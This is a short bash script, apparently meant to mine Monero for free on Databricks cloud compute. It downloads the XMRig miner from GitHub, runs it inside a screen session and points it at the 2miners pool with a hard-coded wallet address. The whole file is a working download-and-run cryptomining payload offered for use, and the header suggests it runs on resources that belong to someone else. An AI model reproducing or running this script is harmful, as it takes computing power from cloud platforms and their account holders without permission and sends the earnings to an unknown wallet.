#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 48fb6CwXF6U2sYiaU6t9PUf9Hirpg1PwpUy5pJ1xp7d5XprW6XHmnFvRTAUQCefMCVMnXbVM6S6VkLzeRyiSjreSNhk9UVt.XMR00PcChr -p x
